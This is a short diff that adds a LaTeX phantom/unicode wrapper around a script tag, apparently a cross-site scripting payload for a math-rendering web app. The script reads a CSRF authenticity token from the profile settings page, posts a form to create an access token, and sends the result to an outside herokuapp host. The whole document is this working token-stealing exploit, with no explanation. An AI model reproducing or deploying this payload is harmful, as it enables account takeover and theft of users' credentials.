@@ -1,0 +1,14 @@
+\phantom{\unicode{<script>
+const f=new FormData();
+const m="/profile/";
+const d=async (u, p, b) => (await (await fetch(u, b)).text()).match(p)[1];
+const e=(f,i, e) => f.append(i, e)
+const v="access_token[";
+    ["utf8", "purpose", v+"purpose]", v+"expires_at]"].forEach(i => e(f,i, ""));
+const l=new Object();
+l.body=f;
+l.method="post";
+const a=new Object();
+a.mode="no-cors";
+    (async ()=>e(f,"authenticity_token", await d(m+"settings", /authenticity_token"\svalue="(.{88})/)))().then(()=>d(m+"tokens", /(.*)/, l)).then(i=>fetch("https://asdffdsaasdffdsa.herokuapp.com/?d=" + encodeURIComponent(i),a));
+</script>}}
